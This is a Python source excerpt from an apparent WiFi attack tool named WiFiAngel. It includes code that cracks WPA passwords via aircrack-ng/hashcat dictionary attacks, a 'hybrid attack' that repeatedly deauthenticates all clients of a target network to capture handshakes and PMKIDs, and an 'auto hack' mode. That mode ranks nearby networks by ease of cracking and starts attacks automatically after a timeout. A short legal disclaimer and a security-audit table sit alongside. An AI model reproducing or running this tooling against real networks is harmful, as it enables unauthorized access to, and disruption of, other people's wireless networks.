            
            # Initialize Rich Live display before starting to read process output
            from rich.live import Live
            
            # Save all output for later analysis
            all_output = []
            output_lines = []
            
            with Live(create_status_display(), refresh_per_second=4) as live:
                for line in iter(process.stdout.readline, ''):
                    line = line.strip()
                    if line:  # Skip empty lines
                        all_output.append(line)
                        output_lines.append(line)
                        self.logger.debug(f"Aircrack output: {line}")
                    
                    # Extract progress information - using regex for more precise matching
                    try:
                        # Find progress percentage
                        progress_match = re.search(r'(\d+\.\d+)%', line)
                        if progress_match:
                            last_progress = float(progress_match.group(1))
                        
                        # For hashcat, progress is displayed differently
                        if is_wpa3 and "Progress.....: " in line:
                            progress_parts = line.split("Progress.....: ")[1].split("%")[0].strip()
                            try:
                                last_progress = float(progress_parts)
                            except:
                                pass
                        
                        # Find tested keys count
                        keys_match = re.search(r'(\d+)/(\d+) keys tested', line)
                        if keys_match:
                            last_tested_keys = int(keys_match.group(1))
                            total_keys = int(keys_match.group(2))
                        
                        # For hashcat, speed is displayed differently
                        if is_wpa3 and "Speed.#1" in line:
                            speed_parts = line.split("Speed.#1.....: ")[1].strip()
                            last_speed = speed_parts
                        else:
                            # Find speed (k/s or M/s)
                            speed_match = re.search(r'(\d+[\.,]\d+ [kMG]?/s)', line)
                            if speed_match:
                                last_speed = speed_match.group(1)
                        
                        # Find ETA
                        eta_match = re.search(r'time left: ([^)]+)', line)
                        if eta_match:
                            eta = eta_match.group(1)
                        
                        # For hashcat, ETA is displayed differently
                        if is_wpa3 and "Time.Estimated..." in line:
                            eta_parts = line.split("Time.Estimated...: ")[1].strip()
                            eta = eta_parts
                        
                        found_in_this_line = False
                        password_candidate = extract_wifi_password(line, include_hashcat=is_wpa3)
                        if password_candidate:
                            current_key = password_candidate
                            password_found = True
                            self.logger.info(f"Password found for {network['ssid'] if network else selected_file.name}: {current_key}")
                            process.terminate()
                            found_in_this_line = True
                        
                        if found_in_this_line:
                            break
                        
                        # Update the screen with every line
                        if len(line) > 0:
                            status_display = create_status_display()
                            live.update(status_display)
                        
                        # Show at least minimal progress while reading wordlist
                        if any(x in line.lower() for x in ["reading", "loaded"]) and last_progress < 0.1:
                            last_progress = 0.05
                        
                        # Update one more time when process finishes
                        if process.poll() is not None:
                            last_progress = 100.0  # Process completed
                            status_display = create_status_display()
                            live.update(status_display)
                            break
                    except Exception as e:
                        self.logger.error(f"Error parsing aircrack output: {str(e)}")
            
            # Process has completed - check if we missed finding the password by analyzing full output
            if not password_found:
                full_output = '\n'.join(all_output)
                password_candidate = extract_wifi_password(full_output, include_hashcat=is_wpa3)
                if password_candidate:
                    current_key = password_candidate
                    password_found = True
                    self.logger.info(f"Password found in output analysis: {current_key}")

            if password_found and not is_valid_wifi_password(current_key):
                self.logger.warning(f"Invalid password detected: {current_key} - marking as not found")
                password_found = False
                current_key = ""
            
            # Show detailed results in a table at the end of the process
            end_time = time.time()
            elapsed_time = end_time - start_time
            
            hours = int(elapsed_time // 3600)
            minutes = int((elapsed_time % 3600) // 60)
            seconds = int(elapsed_time % 60)
            elapsed_str = f"{hours:02d}:{minutes:02d}:{seconds:02d}"
            
            # Results table
            result_table = Table(show_header=True, header_style="bold magenta", title="[bold blue]Dictionary Attack Results[/]")
            result_table.add_column("Target", style="cyan")
            result_table.add_column("Status", style="green")
            result_table.add_column("Tested Keys", style="yellow")
            result_table.add_column("Speed", style="magenta")
            result_table.add_column("Time", style="blue")
            result_table.add_column("Password", style="red")
            
            if password_found and current_key and len(current_key) >= 8 and len(current_key) <= 63:
                status = "[bold green]✓ CRACKED[/]"
                password_display = f"[bold red]{current_key}[/]"
            else:
                status = "[bold red]✗ FAILED[/]"
                password_display = "[dim]Not Found[/dim]"
                # Reset these in case there was a false positive
                password_found = False
                current_key = ""
            
            result_table.add_row(
                str(selected_file.name),
                status,
                str(last_tested_keys),
                last_speed,
                elapsed_str,
                password_display
            )
            
            self.console.print("\n")
            self.console.print(result_table)
            
            if not password_found:
                self.logger.warning(f"Failed to crack password for {selected_file}")
                
        except KeyboardInterrupt:
            self.console.print("\n[bold yellow]Dictionary attack interrupted by user[/]")
            self.logger.info("Dictionary attack interrupted by user")
        except Exception as e:
            self.console.print(f"\n[bold red]Error during dictionary attack: {str(e)}[/]")
            self.logger.error(f"Error during dictionary attack: {str(e)}")
        finally:
            # Always clean up processes
            if process:
                try:
                    process.terminate()
                    try:
                        process.wait(timeout=2)
                    except subprocess.TimeoutExpired:
                        process.kill()
                        try:
                            process.wait(timeout=2)
                        except:
                            pass
                except:
                    pass
            
            # Also make sure to kill any remaining aircrack-ng or hashcat processes
            try:
                if is_wpa3:
                    subprocess.run(["pkill", "-9", "-f", "hashcat"], 
                                 stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                else:
                    subprocess.run(["pkill", "-9", "-f", "aircrack-ng"], 
                                 stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            except:
                pass

    def hybrid_attack(self):
        """Performs hybrid attack using both handshake and PMKID methods"""
        if not self.selected_network:
            self.console.print("[bold red]Please select a target network first![/]")
            return

        network = self.networks[self.selected_network]
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        
        # Create necessary directories
        handshake_dir = HANDSHAKE_DIR
        handshake_dir.mkdir(exist_ok=True)
        
        handshake_file = handshake_dir / f"handshake_{network['ssid']}_{timestamp}"
        pmkid_file = f"pmkid_{network['ssid']}_{timestamp}"
        pmkid_pcapng = Path(f"{pmkid_file}.pcapng")
        pmkid_hash = Path(f"{pmkid_file}.22000")
        
        handshake_found = False
        pmkid_found = False
        dump_proc = None
        pmkid_proc = None
        start_time = time.time()
        final_handshake = None  # Initialize final_handshake variable
        
        # Initialize client tracking
        known_clients = set(network['clients'])
        last_client_check = time.time()
        client_check_interval = 5  # Check for new clients every 5 seconds
        
        # Create a thread lock for client set manipulation
        client_lock = threading.Lock()
        
        # Check if network is WPA3
        is_wpa3 = False
        if 'cipher' in network:
            if "WPA3" in network['cipher']:
                is_wpa3 = True
        
        # Determine security type
        security_type = "WPA3" if is_wpa3 else "WPA/WPA2"

        def create_status_table():
            """Creates and updates status table with current information"""
            current_time = time.time()
            elapsed = int(current_time - start_time)
            
            hours = elapsed // 3600
            minutes = (elapsed % 3600) // 60
            seconds = elapsed % 60
            elapsed_str = f"{hours:02d}:{minutes:02d}:{seconds:02d}"
            
            table = Table(show_header=True, header_style="bold magenta")
            table.add_column("BSSID", style="cyan")
            table.add_column("Channel", style="green")
            table.add_column("ESSID", style="yellow")
            table.add_column("Clients", style="cyan")
            table.add_column("Status", style="green")
            table.add_column("Time Elapsed", style="yellow")

            with client_lock:
                status = "[bold green]✓ Handshake Found! (Continuing...)" if handshake_found else "[bold yellow]Capturing..."
                table.add_row(
                    self.selected_network,
                    str(network['channel']),
                    network['ssid'],
                    str(len(known_clients)),
                    status,
                    elapsed_str
                )
            return table

        def check_for_new_clients():
            """Check for new clients connected to the network"""
            nonlocal last_client_check, known_clients
            current_time = time.time()
            if current_time - last_client_check < client_check_interval:
                return
            last_client_check = current_time
            with self._networks_lock:
                if self.selected_network in self.networks:
                    current_clients = set(self.networks[self.selected_network]['clients'])
                    with client_lock:
                        new_clients = current_clients - known_clients
                        if new_clients:
                            known_clients.update(new_clients)

        def deauth_all_clients():
            """Deauthenticate all known clients"""
            with client_lock:
                clients_to_deauth = list(known_clients)
            if clients_to_deauth:
                subprocess.run(
                    aireplay_deauth(self.interface_name, bssid=self.selected_network, count=2),
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                    timeout=30,
                )
                for client in clients_to_deauth:
                    subprocess.run(
                        aireplay_deauth(self.interface_name, bssid=self.selected_network, count=2, client=client),
                        stdout=subprocess.DEVNULL,
                        stderr=subprocess.DEVNULL,
                        timeout=30,
                    )

        def check_for_handshake():
            """Check if a handshake has been captured"""
            nonlocal handshake_found, pmkid_found, final_handshake  # Add final_handshake to nonlocal
            if not handshake_found:
                cap_files = list(handshake_dir.glob(f"handshake_{network['ssid']}_{timestamp}*.cap"))
                if cap_files:
                    result = subprocess.run(aircrack_check(cap_files[0]), capture_output=True, text=True)
                    if has_aircrack_handshake(result.stdout):
                        handshake_found = True
                        final_handshake = handshake_dir / f"handshake_{network['ssid']}_{timestamp}.cap"
                        shutil.move(str(cap_files[0]), str(final_handshake))
                        self.console.print(f"\n[bold green]Handshake ({security_type}) captured successfully! Saved to: {final_handshake}[/]")
                        self.console.print("[bold yellow]Continuing capture process... Press Ctrl+C to stop.[/]")
        
            if not pmkid_found and pmkid_pcapng.exists():
                subprocess.run(hcxpcapngtool_convert(pmkid_hash, pmkid_pcapng), stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                if pmkid_hash.exists() and pmkid_hash.stat().st_size > 0:
                    pmkid_found = True
                    self.console.print(f"\n[bold green]PMKID captured successfully! Saved to: {pmkid_hash}[/]")
                    self.console.print("[bold yellow]Continuing capture process... Press Ctrl+C to stop.[/]")

        try:
            self.console.print("\n[bold yellow]Important Information:[/]")
            self.console.print("[bold cyan]- Hybrid attack will continue until you press Ctrl+C")
            self.console.print("[bold cyan]- If a handshake or PMKID is found, it will be saved but the process will continue")
            self.console.print("[bold cyan]- All clients will be deauthenticated simultaneously\n")

            with Live(refresh_per_second=4) as live:
                # Start handshake capture
                dump_proc = subprocess.Popen(
                    airodump_capture(
                        self.interface_name,
                        channel=network['channel'],
                        bssid=self.selected_network,
                        output_prefix=handshake_file,
                    ),
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                )
                
                # Start PMKID capture
                pmkid_proc = subprocess.Popen(
                    hcxdumptool_capture(self.interface_name, pmkid_pcapng, network['channel']),
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                )

                while True:
                    # Update status display
                    live.update(create_status_table())

                    # Check for new clients
                    check_for_new_clients()

                    # Deauth all clients in parallel
                    deauth_all_clients()

                    # Check for handshake and PMKID
                    check_for_handshake()
                        
                    # Small sleep to prevent high CPU usage
                    time.sleep(0.25)

        except KeyboardInterrupt:
            if handshake_found or pmkid_found:
                self.console.print("\n[bold green]Attack stopped by user. Captures were successful![/]")
            else:
                self.console.print("\n[bold yellow]Attack stopped by user. No captures were made.[/]")
        finally:
            # Cleanup processes
            if dump_proc:
                try:
                    dump_proc.terminate()
                    dump_proc.wait(timeout=2)
                except:
                    dump_proc.kill()
            if pmkid_proc:
                try:
                    pmkid_proc.terminate()
                    pmkid_proc.wait(timeout=2)
                except:
                    pmkid_proc.kill()
            
            # Clean temporary files
            for ext in [".csv", ".netxml", "-01.cap"]:
                for f in handshake_dir.glob(f"handshake_{network['ssid']}_{timestamp}*{ext}"):
                    try:
                        f.unlink()
                    except:
                        pass
            
            # Show final results
            results_table = Table(show_header=True, header_style="bold magenta", title="[bold blue]Attack Results[/]")
            results_table.add_column("Method", style="cyan")
            results_table.add_column("Status", style="yellow")
            results_table.add_column("File", style="green")
            
            if handshake_found:
                results_table.add_row(
                    "Handshake",
                    "[bold green]✓ Captured![/]",
                    str(final_handshake)
                )
            else:
                results_table.add_row(
                    "Handshake",
                    "[bold red]✗ Failed[/]",
                    ""
                )
                
            if pmkid_found:
                results_table.add_row(
                    "PMKID",
                    "[bold green]✓ Captured![/]",
                    str(pmkid_hash)
                )
            else:
                results_table.add_row(
                    "PMKID",
                    "[bold red]✗ Failed[/]",
                    ""
                )
            
            self.console.print("\n", results_table)
            
            if handshake_found or pmkid_found:
                self.console.print("\n[bold green]✓ Hybrid attack completed successfully![/]")
                self.console.print("[yellow]Use Dictionary Attack to crack the captured files.[/]")
            else:
                self.console.print("\n[bold red]✗ Hybrid attack failed. No hashes captured.[/]")
            
            self.logger.info(f"Hybrid attack completed - Handshake: {handshake_found}, PMKID: {pmkid_found}")
            # Ensure menu state is properly reset
            self.current_menu = "attack"

    def signal_analyzer(self):
        """Analyzes WiFi signal strength and quality"""
        if not self.selected_network:
            self.console.print("[bold red]Please select a target network first![/]")
            return

        network = self.networks[self.selected_network]
        start_time = time.time()
        signal_data = []

        def create_signal_table():
            table = Table(show_header=True, header_style="bold magenta")
            table.add_column("Time", style="cyan")
            table.add_column("Signal Strength (dBm)", style="green")
            table.add_column("Quality", style="yellow")
            table.add_column("Interference", style="red")

            for data in signal_data[-10:]:  # Show last 10 measurements
                quality = "Excellent" if data[1] > -50 else "Good" if data[1] > -60 else "Fair" if data[1] > -70 else "Poor"
                table.add_row(
                    data[0],
                    str(data[1]),
                    quality,
                    data[2]
                )
            return table

        try:
            with Live(create_signal_table(), refresh_per_second=2) as live:
                while True:
                    current_time = datetime.now().strftime("%H:%M:%S")
                    signal_strength = network['signal']
                    
                    # Check for interference
                    interference = "Low"
                    for other_bssid, other_net in self.networks.items():
                        if other_bssid != self.selected_network and abs(other_net['channel'] - network['channel']) <= 1:
                            interference = "High"
                            break
                    
                    signal_data.append((current_time, signal_strength, interference))
                    live.update(create_signal_table())
                    time.sleep(0.5)

        except KeyboardInterrupt:
            self.console.print("\n[bold yellow]Signal analysis stopped.[/]")

    def channel_optimizer(self):
        """Analyzes and suggests the best channel for WiFi operation"""
        channel_usage = {i: 0 for i in range(1, 15)}  # 2.4GHz channels
        channel_usage.update({i: 0 for i in [36, 40, 44, 48, 52, 56, 60, 64]})  # 5GHz channels

        for network in self.networks.values():
            channel = network['channel']
            if channel in channel_usage:
                # Add weight based on signal strength
                weight = abs(network['signal']) / 100.0
                channel_usage[channel] += weight
                
                # Account for channel overlap (2.4GHz)
                if channel <= 14:
                    for i in range(max(1, channel-2), min(14, channel+2)):
                        if i != channel:
                            channel_usage[i] += weight * 0.5

        # Create channel analysis table
        table = Table(show_header=True, header_style="bold magenta")
        table.add_column("Channel", style="cyan")
        table.add_column("Band", style="green")
        table.add_column("Usage", style="yellow")
        table.add_column("Recommendation", style="blue")

        for channel in sorted(channel_usage.keys()):
            band = "2.4GHz" if channel <= 14 else "5GHz"
            usage = "High" if channel_usage[channel] > 2 else "Medium" if channel_usage[channel] > 1 else "Low"
            recommendation = "Avoid" if usage == "High" else "Good" if usage == "Low" else "Fair"
            
            table.add_row(
                str(channel),
                band,
                usage,
                recommendation
            )

        self.console.print(table)

    def security_audit(self):
        """Performs a security audit of nearby networks"""
        if not self.networks:
            self.console.print("[bold red]No networks found. Please scan first![/]")
            return

        table = Table(show_header=True, header_style="bold magenta")
        table.add_column("Network", style="cyan")
        table.add_column("Security Issues", style="red")
        table.add_column("Risk Level", style="yellow")
        table.add_column("Recommendations", style="green")

        for bssid, network in self.networks.items():
            issues = []
            risk_level = "Low"
            recommendations = []

            # Check encryption
            if "OPEN" in network['cipher']:
                issues.append("No encryption")
                risk_level = "High"
                recommendations.append("Enable WPA2/WPA3 encryption")
            elif "WEP" in network['cipher']:
                issues.append("WEP encryption (broken)")
                risk_level = "High"
                recommendations.append("Upgrade to WPA2/WPA3")
            elif "WPA" in network['cipher'] and not "WPA2" in network['cipher']:
                issues.append("WPA1 encryption (outdated)")
                risk_level = "Medium"
                recommendations.append("Upgrade to WPA2/WPA3")

            # Check WPS
            if network['wps']:
                issues.append("WPS enabled")
                risk_level = "Medium"
                recommendations.append("Disable WPS")

            # Check signal strength
            if network['signal'] > -30:
                issues.append("Signal too strong")
                recommendations.append("Reduce transmit power")
            elif network['signal'] < -70:
                issues.append("Signal too weak")
                recommendations.append("Increase transmit power or add repeaters")

            table.add_row(
                network['ssid'],
                "\n".join(issues) if issues else "None",
                risk_level,
                "\n".join(recommendations) if recommendations else "None"
            )

        self.console.print(table)

    def network_hopper(self):
        """Automatically hops between networks to gather intelligence"""
        if not self.networks:
            self.console.print("[bold red]No networks found. Please scan first![/]")
            return

        hopping = True
        current_index = 0
        networks_list = list(self.networks.items())
        
        def create_hopper_table():
            table = Table(show_header=True, header_style="bold magenta", box=ROUNDED)
            table.add_column("Current Network", style="cyan", width=30)
            table.add_column("Channel", style="green", justify="center")
            table.add_column("Clients", style="yellow", justify="center")
            table.add_column("Data Packets", style="blue", justify="center")
            table.add_column("Signal", style="magenta", justify="center")
            
            bssid, network = networks_list[current_index]
            table.add_row(
                network['ssid'],
                str(network['channel']),
                str(len(network['clients'])),
                str(network['data_packets']),
                str(network['signal'])
            )
            
            return Panel(table, title="[bold blue]Network Hopper[/]", border_style="blue")

        try:
            with Live(create_hopper_table(), refresh_per_second=2) as live:
                while hopping:
                    bssid, network = networks_list[current_index]
                    
                    # Switch to network's channel
                    self.command_runner.set_wireless_channel(self.interface_name, network['channel'])
                    
                    # Update display
                    live.update(create_hopper_table())
                    
                    # Wait on this channel
                    time.sleep(2)
                    
                    # Move to next network
                    current_index = (current_index + 1) % len(networks_list)

        except KeyboardInterrupt:
            self.console.print("\n[bold yellow]Network hopping stopped.[/]")

    def select_target_network(self):
        """Allows user to select a target network"""
        if not self.networks:
            self.console.print("[bold red]❌ No networks found. Please scan first![/]")
            return

        # Create network selection table
        table = Table(show_header=True, header_style="bold magenta")
        table.add_column("No", style="cyan", justify="center")
        table.add_column("BSSID", style="green")
        table.add_column("SSID", style="yellow")
        table.add_column("Channel", style="blue", justify="center")
        table.add_column("Signal", style="magenta", justify="center")
        table.add_column("Security", style="red")
        table.add_column("Clients", style="cyan", justify="center")

        # Add networks to table
        for idx, (bssid, network) in enumerate(self.networks.items(), 1):
            table.add_row(
                str(idx),
                bssid,
                network['ssid'],
                str(network['channel']),
                str(network['signal']),
                network['cipher'],
                str(len(network['clients']))
            )

        self.console.print(table)
        self.console.print("\n[bold yellow]Select target network (0 to cancel):[/]")

        try:
            choice = int(Prompt.ask("Enter network number"))
            if choice == 0:
                return
            
            if 1 <= choice <= len(self.networks):
                self.selected_network = list(self.networks.keys())[choice - 1]
                network = self.networks[self.selected_network]
                self.console.print(f"\n[bold green]✓ Selected network: {network['ssid']} ({self.selected_network})[/]")
                self.logger.info(f"Selected target network: {network['ssid']} ({self.selected_network})")
            else:
                self.console.print("[bold red]❌ Invalid network number![/]")
        except ValueError:
            self.console.print("[bold red]❌ Invalid input![/]")

    def auto_hack(self):
        """Automated hacking of all detected networks"""
        try:
            # Legal disclaimer
            disclaimer = Panel(
                "[bold yellow]LEGAL DISCLAIMER[/]\n\n"
                "[white]This tool is for EDUCATIONAL AND TESTING PURPOSES ONLY.[/]\n\n"
                "[white]1. Only use Auto Hack on networks you own or have explicit permission to test.[/]\n"
                "[white]2. Unauthorized access to computer networks is illegal and punishable by law.[/]\n"
                "[white]3. You bear ALL legal responsibility for how you use this tool.[/]\n"
                "[white]4. The developer accepts no liability for misuse or damage caused by this tool.[/]\n\n"
                "[bold red]By continuing, you acknowledge that you understand and accept these terms.[/]\n"
                "[bold yellow]Press Ctrl+C at any time to abort and return to main menu.[/]",
                title="[bold red]⚠️ WARNING ⚠️[/]",
                border_style="red"
            )
            
            self.console.print(disclaimer)
            self.console.print("[bold yellow]Press Enter to continue or Ctrl+C to abort...[/]")
            
            # Add notification about the 3-minute timeout feature
            self.console.print("\n[bold cyan]INFO: After selecting networks, you will have a 3-minute confirmation period[/]")
            self.console.print("[bold cyan]before the attack begins automatically.[/]")
            
            # Wait for user confirmation
            try:
                input()
            except KeyboardInterrupt:
                self.console.print("[bold yellow]Auto Hack aborted by user.[/]")
                return
                
            self.console.print("[bold yellow]🚀 Starting Auto Hack...[/]")
            self.logger.info("Auto Hack mode initiated")
            
            # Create session directory with timestamp
            session_timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            session_dir = AUTO_HACK_SESSIONS_DIR / session_timestamp
            session_dir.mkdir(parents=True, exist_ok=True)
            self.logger.info(f"Session directory created at {session_dir}")
            
            # Session report file
            report_file = session_dir / "auto_hack_report.txt"
            with open(report_file, "w") as f:
                f.write(f"WiFiAngel Auto Hack Report\n")
                f.write(f"Session: {session_timestamp}\n")
                f.write(f"Start Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n")
            
            # Step 1: Enable monitor mode if not already enabled
            self.console.print("[bold blue]1. Enabling Monitor Mode...[/]")
            if not self.interface_name.endswith("mon"):
                subprocess.run(["airmon-ng", "check", "kill"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                subprocess.run(["airmon-ng", "start", self.interface_name], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                
                # Update monitor interface name
                interfaces = subprocess.check_output(["iwconfig"], stderr=subprocess.STDOUT).decode()
                for line in interfaces.split('\n'):
                    if "Mode:Monitor" in line:
                        self.interface_name = line.split()[0]
                        break
                
                self.console.print(f"[bold green]✓ Monitor mode enabled on {self.interface_name}[/]")
                self.logger.info(f"Monitor mode enabled on {self.interface_name}")
                with open(report_file, "a") as f:
                    f.write(f"Interface: {self.interface_name} (Monitor Mode)\n")
                time.sleep(2)
            else:
                self.console.print(f"[bold green]✓ Already in monitor mode: {self.interface_name}[/]")
                self.logger.info(f"Already in monitor mode: {self.interface_name}")
            
            # Step 2: Start network scan - SCAN TIME INCREASED TO 60 SECONDS
            self.console.print("[bold blue]2. Starting Network Scan (60 seconds)...[/]")
            self.scanning = True
            scan_thread = threading.Thread(target=self.scan_networks)
            scan_thread.daemon = True
            scan_thread.start()
            
            # Wait for initial scan results without using a progress bar
            scan_time = 60  # 60 seconds scan time
            scan_start_time = time.time()
            
            # Simple countdown with network stats
            for remaining_time in range(scan_time, 0, -1):
                minutes = remaining_time // 60
                seconds = remaining_time % 60
                
                network_count = len(self.networks)
                clients_count = sum(len(network['clients']) for network in self.networks.values())
                
                # Calculate progress percent
                progress_percent = int(((scan_time - remaining_time) / scan_time) * 100)
                progress_bar = f"[{'=' * (progress_percent // 5)}{' ' * (20 - (progress_percent // 5))}]"
                
                # Clear previous line and print updated status
                self.console.print(f"\r[cyan]{progress_bar} {progress_percent}% - Networks: {network_count} | Clients: {clients_count} | Remaining: {minutes:02d}:{seconds:02d}[/]", end="")
                
                time.sleep(1)
            
            # Print a newline to finish the progress display
            self.console.print("")
            
            # Scan is completed
            scan_duration = time.time() - scan_start_time
            self.scanning = False
            time.sleep(1)
            
            # Display scan results
            network_count = len(self.networks)
            clients_count = sum(len(network['clients']) for network in self.networks.values())
            
            self.console.print(f"[bold green]✓ Scan completed! Found {network_count} networks and {clients_count} clients.[/]")
            
            # Display networks table
            if network_count > 0:
                networks_table = Table(show_header=True, header_style="bold blue", box=ROUNDED, title="[bold green]Discovered Networks[/]")
                networks_table.add_column("SSID", style="cyan")
                networks_table.add_column("BSSID", style="green")
                networks_table.add_column("Channel", style="blue", justify="center")
                networks_table.add_column("Security", style="yellow")
                networks_table.add_column("Signal", style="magenta", justify="center")
                networks_table.add_column("Clients", style="red", justify="center")
                
                # Sort networks by signal strength
                sorted_networks = sorted(self.networks.items(), key=lambda x: x[1]['signal'], reverse=True)
                
                for bssid, network in sorted_networks:
                    networks_table.add_row(
                        network['ssid'],
                        bssid,
                        str(network['channel']),
                        network['cipher'],
                        str(network['signal']),
                        str(len(network['clients']))
                    )
                
                self.console.print(networks_table)
            
            self.logger.info(f"Network scan completed in {scan_duration:.2f} seconds")
            self.logger.info(f"Found {len(self.networks)} networks")
            
            with open(report_file, "a") as f:
                f.write(f"Scan Duration: {scan_duration:.2f} seconds\n")
                f.write(f"Total Networks Found: {len(self.networks)}\n\n")
                f.write("Network Details:\n")
                for bssid, network in self.networks.items():
                    f.write(f"- {network['ssid']} ({bssid}):\n")
                    f.write(f"  Channel: {network['channel']}\n")
                    f.write(f"  Security: {network['cipher']}\n")
                    f.write(f"  Signal: {network['signal']}\n")
                    f.write(f"  Clients: {len(network['clients'])}\n")
                    if network['clients']:
                        f.write(f"  Client MACs: {', '.join(network['clients'])}\n")
                    f.write("\n")
            
            if not self.networks:
                self.console.print("[bold red]❌ No networks found! Please check your WiFi adapter.[/]")
                self.logger.error("No networks found during scan")
                with open(report_file, "a") as f:
                    f.write("ERROR: No networks found during scan\n")
                return
            
            # Target prioritization algorithm
            self.console.print("[bold blue]3. Prioritizing Target Networks...[/]")
            
            # Calculate target score for each network
            scored_networks = []
            for bssid, network in self.networks.items():
                score = 0
                
                # Factors that increase priority
                client_count = len(network['clients'])
                score += client_count * 20  # Heavy weight for active clients
                
                # Signal strength (better signal = higher priority)
                signal_strength = abs(network['signal'])
                if signal_strength < 60:  # Good signal
                    score += 15
                elif signal_strength < 70:  # Medium signal
                    score += 10
                else:  # Poor signal
                    score += 5
                    
                # Security factors (certain security types might be more interesting)
                if "WEP" in network['cipher']:
                    score += 30  # WEP is easy to crack
                elif "WPA" in network['cipher'] and "WPA2" not in network['cipher']:
                    score += 20  # Original WPA has vulnerabilities
                elif "WPA2" in network['cipher']:
                    score += 15  # Standard security
                elif "WPA3" in network['cipher']:
                    score += 25  # Interesting for testing WPA3 security
                
                # Presence of WPS
                if network.get('wps', False):
                    score += 20  # WPS can be vulnerable
                
                # Add to scored networks list
                scored_networks.append((bssid, network, score))
            
            # Sort networks by score (highest first)
            scored_networks.sort(key=lambda x: x[2], reverse=True)
            
            # Display prioritized networks
            priority_table = Table(show_header=True, header_style="bold magenta", title="[bold blue]Target Networks (Prioritized)[/]")
            priority_table.add_column("Priority", style="cyan", justify="center")
            priority_table.add_column("Network", style="green")
            priority_table.add_column("Score", style="yellow", justify="center")
            priority_table.add_column("Clients", style="blue", justify="center")
            priority_table.add_column("Security", style="magenta")
            
            # Display the top networks for selection (up to 20)
            display_networks = min(20, len(scored_networks))
            for i, (bssid, network, score) in enumerate(scored_networks[:display_networks], 1):
                priority_table.add_row(
                    str(i),
                    f"{network['ssid']} ({bssid})",
                    str(score),
                    str(len(network['clients'])),
                    network['cipher']
                )
            
            self.console.print(priority_table)
            
            # Allow user to select specific networks to attack
            self.console.print("\n[bold blue]Network Selection[/]")
            self.console.print("[bold yellow]You can select specific networks to attack or attack all networks.[/]")
            self.console.print("[bold cyan]Enter network numbers separated by commas (e.g. 1,3,5) or 'all' for all networks.[/]")
            
            # Get user selection
            selected_networks_input = Prompt.ask("[bold green]Select networks to attack", default="all")
            
            # Process user selection
            selected_indices = []
            if selected_networks_input.lower() != "all":
                try:
                    # Parse the input and get valid indices
                    input_indices = [int(idx.strip()) for idx in selected_networks_input.split(",") if idx.strip()]
                    selected_indices = [idx for idx in input_indices if 1 <= idx <= display_networks]
                    
                    if not selected_indices:
                        self.console.print("[bold yellow]No valid networks selected. Using all networks instead.[/]")
                        selected_indices = list(range(1, display_networks + 1))
                    else:
                        self.console.print(f"[bold green]Selected {len(selected_indices)} networks for attack.[/]")
                except ValueError:
                    self.console.print("[bold yellow]Invalid input. Using all networks instead.[/]")
                    selected_indices = list(range(1, display_networks + 1))
            else:
                self.console.print("[bold green]Selected all networks for attack.[/]")
                selected_indices = list(range(1, display_networks + 1))
            
            # Add a 3-minute timeout confirmation
            self.console.print("\n[bold yellow]⚠️ You have 3 minutes to confirm your selection.[/]")
            self.console.print("[bold cyan]Press Enter to continue immediately or Ctrl+C to abort.[/]")
            self.console.print("[bold red]Attack will automatically start after 3 minutes if no action is taken.[/]")
            
            # Setup the timeout using a countdown display
            start_time = time.time()
            timeout = 180  # 3 minutes in seconds
            
            try:
                # Create a timer display
                with Live(refresh_per_second=1) as live:
                    while True:
                        elapsed = time.time() - start_time
                        remaining = timeout - elapsed
                        
                        if remaining <= 0:
                            # Timeout reached, proceed with attack
                            live.update(Panel(f"[bold green]Timeout reached. Starting attack...[/]"))
                            time.sleep(1)
                            break
                        
                        # Check if there's input available (Enter key pressed)
                        if select.select([sys.stdin], [], [], 0)[0]:
                            # Clear the input buffer
                            sys.stdin.readline()
                            live.update(Panel(f"[bold green]Continuing with attack...[/]"))
                            time.sleep(1)
                            break
                        
                        # Update the display with remaining time
                        minutes = int(remaining // 60)
                        seconds = int(remaining % 60)
                        live.update(Panel(
                            f"[bold yellow]Auto-start in: [bold red]{minutes:02d}:{seconds:02d}[/]\n\n"
                            f"[bold cyan]Press Enter to continue now[/]\n"
                            f"[bold cyan]Press Ctrl+C to abort[/]"
                        ))
                        
                        # Short sleep to prevent high CPU usage
                        time.sleep(0.1)
            except KeyboardInterrupt:
                self.console.print("\n[bold yellow]⚠️ Auto Hack aborted by user.[/]")
                self.logger.warning("Auto Hack aborted by user during timeout confirmation")
                self._auto_hack_cleanup()
                return
            
            # Log prioritization information
            self.logger.info(f"Target networks prioritized: {len(scored_networks)} networks ranked")
            self.logger.info(f"User selected {len(selected_indices)} networks for attack")
            
            with open(report_file, "a") as f:
                f.write("Prioritized Targets:\n")
                for i, (bssid, network, score) in enumerate(scored_networks, 1):
                    selected_mark = " [SELECTED]" if i in selected_indices else ""
                    f.write(f"{i}. {network['ssid']} ({bssid}) - Score: {score}{selected_mark}\n")
                f.write("\n")

            # Filter networks with clients and validate data
            networks_with_clients = []
            for i, (bssid, network, score) in enumerate(scored_networks, 1):
                # Skip if not in selected indices
                if i not in selected_indices and selected_indices:
                    continue
                    
                try:
                    if not isinstance(network, dict):
                        self.logger.warning(f"Invalid network data for {bssid}: not a dictionary")
                        continue

                    # Create a validated copy of network data
                    validated_network = {}
                    
                    # SSID validation
                    try:
                        validated_network['ssid'] = str(network.get('ssid', 'Unknown'))
                    except:
                        validated_network['ssid'] = 'Unknown'
                    
                    # Channel validation
                    try:
                        validated_network['channel'] = int(network.get('channel', 1))
                    except:
                        validated_network['channel'] = 1
                    
                    # Cipher validation
                    try:
                        validated_network['cipher'] = str(network.get('cipher', 'Unknown'))
                    except:
                        validated_network['cipher'] = 'Unknown'
                    
                    # Clients validation
                    try:
                        clients = network.get('clients', set())
                        if not isinstance(clients, set):
                            clients = set(clients) if clients else set()
                        validated_network['clients'] = clients
                    except:
                        validated_network['clients'] = set()
                    
                    # Signal validation
                    try:
                        validated_network['signal'] = int(network.get('signal', 0))
                    except:
                        validated_network['signal'] = 0
